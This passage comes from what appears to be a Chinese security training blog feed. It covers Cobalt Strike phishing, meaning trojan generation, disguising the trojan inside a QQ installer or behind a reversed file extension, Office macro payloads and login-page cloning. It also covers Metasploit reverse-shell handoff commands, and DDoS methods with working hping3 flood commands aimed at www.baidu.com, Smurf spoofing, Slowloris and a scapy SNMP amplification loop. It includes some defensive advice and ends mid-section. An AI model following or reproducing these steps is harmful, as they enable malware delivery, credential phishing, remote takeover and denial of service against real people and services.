style="zoom: 33\%;" /><p>2、生成木马</p><img src="/img/oldboy/1-33.png" style="zoom: 50\%;" /><p>将文件保存到桌面即可</p><p>3、通过钓鱼、社工的方式将可执行exe文件发送至靶机，并诱导点击</p><img src="/img/oldboy/1-34.png" style="zoom:50\%;" /><h5 id="木马隐藏（压缩法）"><a href="#木马隐藏（压缩法）" class="headerlink" title="木马隐藏（压缩法）"></a>木马隐藏（压缩法）</h5><p>1、设置为压缩文件</p><img src="/img/oldboy/1-36.png" style="zoom:50\%;" /><p>设置文件自解压至指定文件夹（尽量选择用户含有的文件夹）</p><img src="/img/oldboy/1-37.png" style="zoom:50\%;" /><p>先解压外壳文件QQ的安装软件，然后运行木马文件</p><img src="/img/oldboy/1-38.png" style="zoom:50\%;" /><p>隐藏文件</p><img src="/img/oldboy/1-39.png" style="zoom:50\%;" /><img src="/img/oldboy/1-40.png" style="zoom:50\%;" /><p>2、使用Restorator2018，将QQ安装包，以及EXE文件拖到程序里</p><p>这里可以看到压缩之后的文件，图标发生了改变，需要将图标进行替换</p><p><strong>别忘记crtl+s保存，使之生效</strong></p><img src="/img/oldboy/1-35.png" style="zoom:50\%;" /><p>双击测试：</p><p><img src="/img/oldboy/1-41.png"></p><p>上线成功</p><p><img src="/img/oldboy/1-42.png"></p><h5 id="文件反转法"><a href="#文件反转法" class="headerlink" title="文件反转法"></a>文件反转法</h5><p>通过将EXE文件后缀反转的方式，隐藏exe后缀</p><p>将文件命名为cmdgpj.exe</p><img src="/img/oldboy/1-44.png" style="zoom:50\%;" /><p>在线生成图标：<a href="https://www.bitbug.net/">https://www.bitbug.net/</a></p><p>打开Resource Hacker工具，在file中open打开exe木马文件，选择上传图标，crtl+s保存</p><img src="/img/oldboy/1-45.png" style="zoom:50\%;" /><p>生成图标</p><img src="/img/oldboy/1-47.png" style="zoom:33\%;" /><p>诱导点击使之上线</p><p> <img src="/img/oldboy/1-46.png"></p><h4 id="office宏钓鱼"><a href="#office宏钓鱼" class="headerlink" title="office宏钓鱼"></a>office宏钓鱼</h4><p>首先cs生成宏</p><img src="file:///C:\Users\ZhuanZ\AppData\Local\Temp\ksohtml13624\wps1.jpg" alt="img" style="zoom:50\%;" /> <p>选择复制</p><img src="file:///C:\Users\ZhuanZ\AppData\Local\Temp\ksohtml13624\wps2.jpg" alt="img" style="zoom:50\%;" /> <p>新建一个word</p><p>打开Word文档，点击 “Word 选项 — 自定义功能区 — 开发者工具(勾选) — 确定” 。</p><img src="file:///C:\Users\ZhuanZ\AppData\Local\Temp\ksohtml13624\wps3.jpg" alt="img" style="zoom:50\%;" /> <p>编写主体内容后，点击 “开发工具 — Visual Basic”，双击 “ThisDocument”<br>，将原有内容全部清空，然后将宏payload全部粘贴进去，保存并关闭该 VBA 编辑器 。</p><img src="file:///C:\Users\ZhuanZ\AppData\Local\Temp\ksohtml13624\wps4.jpg" alt="img" style="zoom:50\%;" /> <p>另存为</p><img src="file:///C:\Users\ZhuanZ\AppData\Local\Temp\ksohtml13624\wps5.jpg" alt="img" style="zoom:50\%;" /> <h4 id="克隆网站钓鱼"><a href="#克隆网站钓鱼" class="headerlink" title="克隆网站钓鱼"></a>克隆网站钓鱼</h4><p>示例页面：<a href="http://www.9377.com/login.php">网页游戏平台_精品手游_一起玩更快乐-9377网页游戏</a></p><p>使用cs克隆网站登录页面</p><img src="/img/oldboy/1-48.png" style="zoom:50\%;" /><p>获得attack url：<a href="http://192.168.138.129:81/">http://192.168.138.129:81/</a></p><p>诱导用户点击</p><img src="/img/oldboy/1-49.png" style="zoom:50\%;" /><p>查看weblog记录</p><img src="/img/oldboy/1-50.png" style="zoom: 33\%;" /><h3 id="MSF联动"><a href="#MSF联动" class="headerlink" title="MSF联动"></a>MSF联动</h3><p>CS Server端和CS Client端工具开启方式直接略过</p><h4 id="CS反弹shell到MSF"><a href="#CS反弹shell到MSF" class="headerlink" title="CS反弹shell到MSF"></a>CS反弹shell到MSF</h4><p>参考资料:<a href="https://blog.csdn.net/Zlirving_/article/details/113862910">https://blog.csdn.net/Zlirving_/article/details/113862910</a></p><p>先建立监听器</p><p>上线</p><img src="/img/oldboy/wps1.jpg" alt="img" style="zoom: 80\%;" />  <p>Msf进入监听模块</p><p>​use exploit&#x2F;multi&#x2F;handler</p><p>​set payload windows&#x2F;meterpreter&#x2F;reverse_http</p><p>​set lhost 192.168.0.109</p><p>​set lport 8011</p><p>​Exploit</p><p>CS添加监听器</p><p><img src="/img/oldboy/wps2.jpg" alt="img"></p><p>右键上线的主机，增加会话</p><p><img src="/img/oldboy/wps3.jpg" alt="img"> </p><p>或者直接spawn cs-msf（监听器名称）</p><p><img src="/img/oldboy/wps4.jpg" alt="img"> </p><p>Msf的联动成功</p><h4 id="MSF反弹shell到CS"><a href="#MSF反弹shell到CS" class="headerlink" title="MSF反弹shell到CS"></a>MSF反弹shell到CS</h4><p>msf制作木马进行上线</p><p>​msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.0.102 LPORT&#x3D;4444 -f exe -o msf.exe</p><p>进入msf监听模块</p><p>​use exploit&#x2F;multi&#x2F;handler</p><p>设置payload反弹shell（使用和木马相同的payload）</p><p>​set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</p><p>设置LHOST、LPORT参数</p><p>​set LHOST 192.168.31.24(本地IP）</p><p>​set LPORT 4444（设置的端口）</p><p>​show options</p><p>开始攻击</p><p><img src="/img/oldboy/wps5.jpg" alt="img"> </p><p>后台运行</p><p><img src="/img/oldboy/wps6.jpg" alt="img"> </p><p>启动CS并创建监听器</p><p><img src="/img/oldboy/wps7.jpg" alt="img"> </p><p>MSF上使用payload_inject模块</p><p>​use exploit&#x2F;windows&#x2F;local&#x2F;payload_inject &#x2F;&#x2F;使用该模块可以将 Metasploit 获取到的会话注入到CS中</p><p>​set payload windows&#x2F;meterpreter&#x2F;reverse_http &#x2F;&#x2F;和cs监听器保持一致</p><p>​set prependmigrate true </p><p>​set DisablePayloadHandler true &#x2F;&#x2F;用来禁用 Metasploit payload handler的监听 因为要监听到cs上</p><p>​set lhost 192.168.0.109   &#x2F;&#x2F;CS的IP</p><p>​set lport 1111  &#x2F;&#x2F;CS上的listen端口</p><p>​set session 7  &#x2F;&#x2F;要转发的session</p><p><img src="/img/oldboy/wps8.jpg" alt="img"> </p><p>Run</p><p><img src="/img/oldboy/wps9.jpg" alt="img"> </p><h3 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h3><p>看到报警平台报警存在外连，可能是通过cs工具外连解决思路：</p><p>当CS配置了域前置，通过ping或者查看外连端口的IP，放到危险报警平台分析，通常会显示正常的CDN服务器，将CDN所在的服务厂商直接封禁掉，或者直接把他的域名禁止掉。</p><p>注意：进程号是rundll32.exe，可能是远控端口</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> 老男孩安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 老男孩安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>老男孩--DDOS攻击与防御(4)</title>
      <link href="/2025/05/12/oldboy4/"/>
      <url>/2025/05/12/oldboy4/</url>
      
        <content type="html"><![CDATA[<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><p><strong>本教程仅在合法授权的情况下进行测试和研究，请勿用于其他用途。未经授权使用此类工具可能会侵犯他人隐私，触犯相关法律，任何因此引发的法律或利益纠纷与本人无关。</strong></p><h3 id="DDOS介绍"><a href="#DDOS介绍" class="headerlink" title="DDOS介绍"></a>DDOS介绍</h3><p>DOS攻击：指的是采取一对一的方式，攻击目标服务器，使攻击目标CPU使用率提高，网络可以带宽减少等方式耗尽服务器的资源</p><p><strong>DDOS攻击：攻击指借助于客户&#x2F;服务器技术，将多个计算机联合起来作为攻击平台，对一个或多个目标发动DoS攻击，从而成倍地提高拒绝服务攻击的威力。</strong></p><p>被攻击时的现象：</p><ol><li>被攻击的主机上<strong>有大量等待的TCP连接</strong>。</li><li>网络中充<strong>斥着大量的无用的数据包，源地址为假</strong>。</li><li>制造<strong>高流量无用数据，造成网络拥塞</strong>，使被攻击的主机无法正常通信。</li><li>利用受害主机提供的服务或传输协议上的缺陷，反复高速的发出特定的服务请求，<strong>使受害主机无法及时处理所有正常请求。</strong></li><li>严重时会造成<strong>系统死机</strong>。</li></ol><h1 id="DDOS类型"><a href="#DDOS类型" class="headerlink" title="DDOS类型"></a>DDOS类型</h1><h2 id="流量型攻击"><a href="#流量型攻击" class="headerlink" title="流量型攻击"></a>流量型攻击</h2><h3 id="ICMP-Flood攻击"><a href="#ICMP-Flood攻击" class="headerlink" title="ICMP Flood攻击"></a>ICMP Flood攻击</h3><h4 id="攻击介绍"><a href="#攻击介绍" class="headerlink" title="攻击介绍"></a>攻击介绍</h4><p>攻击原理：就是向目标发送大量的 ICMP <code>Echo-Reply（type 0，code 0）</code>或 <code>Echo-Request（type 8，code0）</code>报文。目的一般为耗尽目标服务器的带宽，并且机器去处理这些请求也会占用一点IO\CPU资源，但资源消耗过大就会导致DoS。</p><h4 id="测试工具"><a href="#测试工具" class="headerlink" title="测试工具"></a>测试工具</h4><p>hping3</p><p><a href="https://www.cnblogs.com/liuxinyustu/articles/12808972.html">hping3 使用详解 - liuxinyu123 - 博客园</a></p><p>1、UDP ddos攻击：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hping3 -c 10000 -d 120 --udp -w 64 -p 80 --flood --rand-source www.baidu.com</span><br></pre></td></tr></table></figure><p>2、ICMP ddos攻击：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hping3 -c 10000 -d 120 --icmp -w 64 -p 80 --flood --rand-source www.baidu.com</span><br></pre></td></tr></table></figure><h3 id="Smurf攻击"><a href="#Smurf攻击" class="headerlink" title="Smurf攻击"></a>Smurf攻击</h3><h4 id="攻击介绍-1"><a href="#攻击介绍-1" class="headerlink" title="攻击介绍"></a>攻击介绍</h4><p><strong>1、介绍</strong></p><p>​Smurf攻击是一种分布式拒绝服务攻击（DDOS）攻击，利用IP协议中的ICMP请求和网络广播的特性，发送大量的<strong>ICMP Echo</strong>请求包，使目标主机造成网络带宽堵塞、资源消耗、拒绝服务等。</p><p><strong>2、攻击原理</strong></p><ol><li>攻击者伪造受害者的IP地址向本网络广播地址发送<strong>ICMP Echo</strong>请求包</li><li>网络广播地址代表本网段的所有设备（实际上相当于发送给了所有主机<strong>ICMP Echo</strong>请求包）</li><li>本网段内的主机进行<strong>ICMP Echo</strong>回应包发送给请求的主机</li><li>受害者接收到海量回应包</li></ol><p><strong>3、应对方法</strong></p><ol><li>过滤广播地址：在网络的出口路由器上配置过滤规则，禁止广播地址的流量通过，阻止攻击者的Echo Request报文进入目标网络。</li><li>启用反向路径过滤（Reverse Path Filtering）：通过验证数据包的源IP地址是否为网络出口合法的路径返回地址，来过滤掉源IP地址伪造的报文。</li><li>使用流量限制措施：通过使用防火墙和入侵检测系统（IDS）等技术，对网络流量进行监控和管理，及时发现并限制异常流量。</li><li>升级网络设备：确保网络设备的固件和软件及时更新至最新版本，以修复已知漏洞，提升网络安全性。</li></ol><h4 id="测试工具-1"><a href="#测试工具-1" class="headerlink" title="测试工具"></a>测试工具</h4><p>使用Kali hping3进行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo hping3 -1 -a 192.168.1.100 -c 10000 192.168.1.255</span><br><span class="line"></span><br><span class="line">-l：使用ICMP协议</span><br><span class="line">-a：伪造的受害者IP地址</span><br><span class="line">-c：发送的请求次数</span><br><span class="line">192.168.1.255：本网段的广播地址</span><br></pre></td></tr></table></figure><h3 id="Ping-of-Death"><a href="#Ping-of-Death" class="headerlink" title="Ping of Death"></a>Ping of Death</h3><h4 id="攻击介绍-2"><a href="#攻击介绍-2" class="headerlink" title="攻击介绍"></a>攻击介绍</h4><p><strong>1、介绍</strong></p><p>​Ping of Death：又称为死亡之ping，通过大量的畸形ICMP请求包</p><p><strong>2、攻击原理</strong></p><p>​这种攻击通过发送大于65536字节的ICMP包使操作系统崩溃；通常不可能发送大于65536个字节的ICMP包，但可以把报文分割成片段，然后在目标主机上重组；最终会导致被攻击目标缓冲区溢出，引起拒绝服务攻击。有些时候导致telnet和http服务停止，有些时候路由器重启。</p><p><strong>3、适用版本</strong></p><ol><li><strong>Windows 系统：</strong><ul><li>Windows 95</li><li>Windows 98</li><li>Windows ME</li><li>Windows NT 4.0（未打补丁的版本）</li></ul></li><li><strong>Linux 系统：</strong><ul><li>早期的 Linux 内核版本（2.0及更早版本）</li><li>某些未修补的嵌入式 Linux 系统</li></ul></li><li><strong>Unix 系统：</strong><ul><li>BSD&#x2F;OS（某些版本）</li><li>早期的 Solaris 和 HP-UX 版本</li></ul></li></ol><h4 id="测试方法"><a href="#测试方法" class="headerlink" title="测试方法"></a>测试方法</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping -l 65500 192.168.2.1 -t</span><br></pre></td></tr></table></figure><h3 id="UDP-Flood攻击"><a href="#UDP-Flood攻击" class="headerlink" title="UDP Flood攻击"></a>UDP Flood攻击</h3><h4 id="攻击介绍-3"><a href="#攻击介绍-3" class="headerlink" title="攻击介绍"></a>攻击介绍</h4><p><strong>1、介绍</strong></p><p>​向攻击者向受害者发送大量的UDP数据包，造成受害者服务器卡顿、负载提示、网络卡顿等问题</p><p><strong>2、攻击原理</strong></p><p>​在短时间内 <strong>模拟随机的源端口地址向随机的目的端口发送大量的udp包，造成目标主机不能处理其他udp的请求</strong></p><p><strong>3、防御方法</strong></p><p>​UDP是无状态连接协议，常用于僵尸网络的DDOS攻击，比起TCP来说更难防御。通过设置防火墙，对UDP包的IP，端口，速率可针对性防御。另外，UDP Flood除了消耗受害者资源，也会消耗大量攻击者资源。</p><h4 id="测试方法-1"><a href="#测试方法-1" class="headerlink" title="测试方法"></a>测试方法</h4><p>1、使用hping3 进行测试</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">hping3 -c 10000 -d 120 --udp -w 64 -p 80 --flood --rand-source www.baidu.com</span><br><span class="line"></span><br><span class="line">--udp：使用udp进行攻击</span><br><span class="line">-p：指定攻击的端口</span><br><span class="line">-c：请求次数</span><br><span class="line">-d：发送的数据包大小</span><br><span class="line">-w：窗口大小</span><br><span class="line">--flood：尽最快发送数据包，不显示回复</span><br><span class="line">--rand-source：产生随机源端口</span><br></pre></td></tr></table></figure><h2 id="连接型攻击"><a href="#连接型攻击" class="headerlink" title="连接型攻击"></a>连接型攻击</h2><h3 id="TCP-Flood攻击"><a href="#TCP-Flood攻击" class="headerlink" title="TCP Flood攻击"></a>TCP Flood攻击</h3><h4 id="攻击介绍-4"><a href="#攻击介绍-4" class="headerlink" title="攻击介绍"></a>攻击介绍</h4><p>1、介绍：</p><p>了解TCP Flood攻击需要先了解TCP的三次握手机制：</p><p><img src="/img/oldboy/z9yrv9cbz3.png" alt="img"></p><ol><li>客户端向服务都发送一个SYN包，用来请求与服务器建立连接</li><li>服务器收到SYN包，回复一个SYN+ACK包，用于表示可以与客户端建立连接</li><li>客户端收到服务器发送的SYN+ACK包，向服务器发送ACK，表示连接状态建立</li></ol><p>TCP Flood攻击：利用了这种会话建立机制，大量向服务端发送SYN请求包请求建立连接，收到SYN+ACK包后，不会发送ACK包，导致服务器一直占用会话耗尽服务器资源。</p><h4 id="渗透方法"><a href="#渗透方法" class="headerlink" title="渗透方法"></a>渗透方法</h4><p>SYN ddos攻击：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">hping3 -c 10000 -d 120 -S -w 64 -p 80 --flood --rand-source www.baidu.com</span><br><span class="line"></span><br><span class="line">-c：发送的请求数量</span><br><span class="line">-d：发送到攻击方的数据包大小</span><br><span class="line">-S：只发送SYN包</span><br><span class="line">-w：指定窗口大小</span><br><span class="line">-p：指定攻击的窗口，可以使用任意端口</span><br><span class="line">--flood：尽量快速的发送</span><br><span class="line">--rand-source：源ip随机产生</span><br></pre></td></tr></table></figure><h3 id="ACK洪水攻击"><a href="#ACK洪水攻击" class="headerlink" title="ACK洪水攻击"></a>ACK洪水攻击</h3><h4 id="攻击介绍-5"><a href="#攻击介绍-5" class="headerlink" title="攻击介绍"></a>攻击介绍</h4><p><strong>1、介绍</strong></p><p>​ACK洪水攻击：实在TCP建立完连接之后，攻击者将所有传输的TCP数据包都带有ACK标志位的数据包。</p><p><strong>2、原理</strong></p><p>​接收端在收到一个带有ACK标志位的数据包的时候，需要检查该数据包所表示的连接<a href="https://zhida.zhihu.com/search?content_id=163715515&content_type=Article&match_order=1&q=%E5%9B%9B%E5%85%83%E7%BB%84&zhida_source=entity">四元组</a>是否存在，如果存在则检查该数据包所表示的状态是否合法，然后再向应用层传递该数据包。</p><p>​如在检查中发现数据包不合法，如所指向的目的端口未开放，则操作系统<a href="https://zhida.zhihu.com/search?content_id=163715515&content_type=Article&match_order=1&q=%E5%8D%8F%E8%AE%AE%E6%A0%88&zhida_source=entity">协议栈</a>会回应RST包告诉对方此端口不存在。</p><p><strong>此时服务器要做两个动作，查表和回应ack&#x2F;rst。</strong></p><p>​对攻击者来说发送带有ACK标志位的TCP数据包消耗小；</p><p>​但对于服务器进行查表动作时，所消耗的资源大于攻击者发送数据包的消耗</p><p><img src="/img/oldboy/v2-10d27a4b6b6f0ce0a82d0e9217a08ec1_1440w.jpg" alt="img"></p><p><strong>3、防御方法</strong></p><p>抗D设备基于目的地址对ack报文速率进行统计，当ack报文速率超过阈值启动源认证防御。</p><h4 id="测试方法-2"><a href="#测试方法-2" class="headerlink" title="测试方法"></a>测试方法</h4><p>ACK ddos攻击：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">hping3 -c 10000 -d 120 -A -w 64 -p 80 --flood --rand-source www.baidu.com</span><br><span class="line"></span><br><span class="line">-c：发送的请求数量</span><br><span class="line">-d：发送到攻击方的数据包大小</span><br><span class="line">-A：参数用于设置 TCP 包头中的 ACK（确认，Acknowledgment）标志。ACK 标志用于表示该包是一个确认包，通常用于 TCP 协议中确认接收到数据。</span><br><span class="line">-w：指定窗口大小</span><br><span class="line">-p：指定攻击的窗口，可以使用任意端口</span><br><span class="line">--flood：尽量快速的发送</span><br><span class="line">--rand-source：源ip随机产生</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="WebSocket攻击"><a href="#WebSocket攻击" class="headerlink" title="WebSocket攻击"></a><strong>WebSocket攻击</strong></h3><h4 id="攻击介绍-6"><a href="#攻击介绍-6" class="headerlink" title="攻击介绍"></a>攻击介绍</h4><p><strong>1、websocket介绍</strong></p><p>​WebSocket是通过HTTP协议发起的一个双向<a href="https://so.csdn.net/so/search?q=%E5%85%A8%E5%8F%8C%E5%B7%A5&spm=1001.2101.3001.7020">全双工</a>的通信协议。WebSocket协议被广泛用在现代WEB程序中用于数据流的传输和异步通信。</p><p><strong>2、websocket和http区别</strong></p><p>大多数的Web浏览器和Web网站都是使用HTTP协议进行通信的。通过HTTP协议，客户端发送一个HTTP请求，然后服务器返回一个响应。通常来说，服务端返回一个响应后，这个HTTP请求事务就已经完成了。即使这个HTTP连接处于keep-alive的状态，它们之间的每一个工作(事务)依然是请求与响应，请求来了，响应回去了。这个事务就结束了。所以通常来说，HTTP协议是一个基于事务性的通信协议。</p><p>而WebSocket呢，它通常是由HTTP请求发起建立的，建立连接后，会始终保持连接状态。客户端和服务端可以随时随地的通过一个WebSocket互发消息，没有所谓事务性的特点。这里要注意了，源于其双向全双工的通信特点，在一个WebSocket连接中，服务端是可以主动发送消息的哦，这一点已经完全区别于HTTP协议了。</p><p>因此，基于以上特点，WebSocket通常用于低延迟和允许服务器发送消息的场景。例如，金融行业常用WebSocket来传输实时更新的数据。</p><p><strong>3、攻击原理</strong></p><ul><li>使用WebSocket协议的持久连接，攻击者发送大量数据或保持长连接。</li><li>消耗服务器资源，导致正常用户无法访问。</li></ul><h2 id="特殊协议缺陷型攻击"><a href="#特殊协议缺陷型攻击" class="headerlink" title="特殊协议缺陷型攻击"></a>特殊协议缺陷型攻击</h2><h3 id="Slowloris慢性攻击"><a href="#Slowloris慢性攻击" class="headerlink" title="Slowloris慢性攻击"></a>Slowloris慢性攻击</h3><h4 id="攻击介绍-7"><a href="#攻击介绍-7" class="headerlink" title="攻击介绍"></a>攻击介绍</h4><p><strong>1、介绍</strong></p><p>Slowloris 的核心原理是通过建立大量半开的 HTTP 连接，耗尽目标服务器的资源，导致它无法处理合法的请求。它发送部分 [HTTP 请求头](<a href="https://so.csdn.net/so/search?q=HTTP">https://so.csdn.net/so/search?q=HTTP</a> 请求头&amp;spm&#x3D;1001.2101.3001.7020)，但从不完成请求，并定期发送数据保持连接处于活跃状态。这样，目标服务器会持续消耗资源等待完成的请求。<br><strong>2、攻击原理</strong></p><p>1.发出大量 HTTP 请求。<br>2.定期（每约 15 秒）发送标头以保持连接打开。<br>3.除非服务器这样做，否则我们永远不会关闭连接。如果服务器关闭一个连接，我们会创建一个新连接，继续做同样的事情。</p><p>这会耗尽服务器线程池，并且服务器无法回复其他人。 </p><p><strong>3、防范措施</strong></p><p>如何防护Slowloris攻击<br>1、提高服务器的客户端连接数量</p><p>2、限制传入请求个数：限制单个IP 地址允许建立的最大连接数</p><p>3、使用一些DDOS方法安全工具</p><p>4、限制HTTP头部传输的最大许可时间：超过指定时间HTTP Header还没有传输完成，直接判定源IP地址为慢速连接攻击，中断连接并加入黑名单。</p><h4 id="测试方法-3"><a href="#测试方法-3" class="headerlink" title="测试方法"></a>测试方法</h4><p><a href="https://github.com/gkbrk/slowloris">gkbrk&#x2F;slowloris: Low bandwidth DoS tool. Slowloris rewrite in Python.</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">python slowloris.py 192.168.30.158</span><br><span class="line"></span><br><span class="line">positional arguments:</span><br><span class="line">  host                  Host to perform stress test on</span><br><span class="line"></span><br><span class="line">options:</span><br><span class="line">  -h, --help            show this help message and exit</span><br><span class="line">  -p PORT, --port PORT  Port of webserver, usually 80</span><br><span class="line">  -s SOCKETS, --sockets SOCKETS</span><br><span class="line">                        Number of sockets to use in the test</span><br><span class="line">  -v, --verbose         Increases logging</span><br><span class="line">  -ua, --randuseragents</span><br><span class="line">                        Randomizes user-agents with each request</span><br><span class="line">  -x, --useproxy        Use a SOCKS5 proxy for connecting</span><br><span class="line">  --proxy-host PROXY_HOST</span><br><span class="line">                        SOCKS5 proxy host</span><br><span class="line">  --proxy-port PROXY_PORT</span><br><span class="line">                        SOCKS5 proxy port</span><br><span class="line">  --https               Use HTTPS for the requests</span><br><span class="line">  --sleeptime SLEEPTIME</span><br><span class="line">                        Time to sleep between each header sent.</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="DNS放大攻击"><a href="#DNS放大攻击" class="headerlink" title="DNS放大攻击"></a><strong>DNS放大攻击</strong></h3><h4 id="攻击介绍-8"><a href="#攻击介绍-8" class="headerlink" title="攻击介绍"></a>攻击介绍</h4><p><strong>1、介绍</strong></p><p>​DNS放大攻击：攻击者通过恶意构造udp数据包报头，伪造受害者的IP信息，向DNS服务器发送解析请求，将DNS服务器的响应包引入给受害者服务器。</p><p>​DNS查询通常通过UDP协议发送。UDP是一种“发即忘”协议，这意味着不需要通过握手来验证数据包IP地址的真实性。</p><p><strong>2、攻击原理</strong></p><p>​攻击者的dns查询包消耗很小，但返回的响应包数据量很大，所以攻击者伪造受害者IP大量请求DNS解析请求，将查询的大量记录返回给受害者IP造成受害者服务器资源耗尽，服务器宕机。</p><p><strong>3、防御措施</strong></p><p>限制DNS服务器的递归查询、部署流量清洗设备以及使用DNSSEC协议</p><h3 id="SNMP放大攻击"><a href="#SNMP放大攻击" class="headerlink" title="SNMP放大攻击"></a>SNMP放大攻击</h3><h4 id="攻击介绍-9"><a href="#攻击介绍-9" class="headerlink" title="攻击介绍"></a>攻击介绍</h4><p><strong>1、介绍</strong></p><p>​snmp：通过一台客户端机器向一个被管理的设备发出查询请求获取这台设备当前运行状态的检测等情况，网络监控一般是基于SNMP与Agent。</p><p>​在SNMP的服务中，被监控设备端口UDP 161为主动查询请求；162端口为监控方在固定时间内受监控端向监控端自动发送查询请求。<br>同时管理信息数据库MIB是一个信息存储库，包含管理代理中的有关配置和性能的数据，按照不同分类（类似树形图），包含分属不同组的多个数据对象</p><p><strong>2、攻击原理</strong></p><p>​利用SNMP协议的请求-响应机制，发送大量SNMP Get请求，伪造源IP。</p><p><strong>3、影响危害</strong></p><p>​目标网络因响应数据过多而拥塞。</p><p><strong>4、防御方法</strong></p><p>​禁用SNMP或限制其访问，定期更新固件防止漏洞利用。</p><h4 id="测试方法-4"><a href="#测试方法-4" class="headerlink" title="测试方法"></a>测试方法</h4><p>1、使用nmap扫描指定的地址端</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nmap -sU 192.168.10.1</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">snmp------&gt;</span><span class="language-bash">192.168.10.24</span></span><br></pre></td></tr></table></figure><p>2、构建python脚本</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/usr/bin/env python</span></span><br><span class="line">from scapy.all import *</span><br><span class="line">i = IP(dst=&quot;192.168.10.24&quot;,src=&quot;192.168.10.234&quot;)</span><br><span class="line">u = UDP(sport=161,dport=161)</span><br><span class="line">s = SNMP(community=&#x27;public&#x27;)</span><br><span class="line">b = SNMPbulk(max_repetitions=200,varbindlist=[SNMPvarbind(oid=ASN1_OID(&#x27;1.3.6.1.2.1.1&#x27;)),SNMPvarbind(oid=ASN1_OID(&#x27;1.3.6.1.2.1.19.1.3&#x27;))])</span><br><span class="line">s.PDU=b</span><br><span class="line">r = i/u/s</span><br><span class="line">while 1:</span><br><span class="line">send(r)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="HTTP洪水攻击"><a href="#HTTP洪水攻击" class="headerlink" title="HTTP洪水攻击"></a>HTTP洪水攻击</h3><h4 id="攻击介绍-10"><a href="#攻击介绍-10" class="headerlink" title="攻击介绍"></a>攻击介绍</h4><p><strong>1、介绍</strong></p><p>​HTTP洪水攻击： HTTPFlood是一种针对Web服务的第七层攻击，通过模拟正常用户请求消耗服务器资源。</p><p><strong>2、攻击原理</strong></p><p>​攻击者通过代理或僵尸主机向目标服务器发起大量的HTTP报文，<strong>请求涉及数据库操作的URI（Universal Resource Identifier）</strong>或其它消耗系统资源的URI，造成服务器资源耗尽，无法响应正常请求。</p><p><strong>3、防御方法</strong></p><p>HTTP Flood源认证：</p><ul><li>META刷新：阻止非浏览器客户端的访问，僵尸工具无法通过认证。</li><li>验证码认证：通过推送验证码判断HTTP访问是否由真实用户发起，防御效果较好。</li><li>302重定向模式：对嵌套资源服务器启动302重定向防御，探测访问源是否为真实浏览器。</li></ul><p>HTTP源统计：</p><p>​HTTP源统计是在基于目的IP流量异常的基础上，对源IP流量进行统计，判定具体某个源流量异常，并对其进行限速。</p><p>动态指纹学习</p><p>​动态指纹学习适用于攻击源访问的URI比较固定的情况。Anti-DDoS设备对源访问的URI进行指纹学习，找到攻击目标URI指纹，如果对该URI指纹的命中次数高于设置的阈值就将该源加入黑名单。</p><h4 id="测试方法-5"><a href="#测试方法-5" class="headerlink" title="测试方法"></a>测试方法</h4><p>​工具：</p><p><img src="/img/oldboy/image-20250330103648189.png" alt="image-20250330103648189"></p><p><strong>注意 填写的url要与数据库进行交互</strong></p><h3 id="CC攻击"><a href="#CC攻击" class="headerlink" title="CC攻击"></a>CC攻击</h3><h4 id="攻击介绍-11"><a href="#攻击介绍-11" class="headerlink" 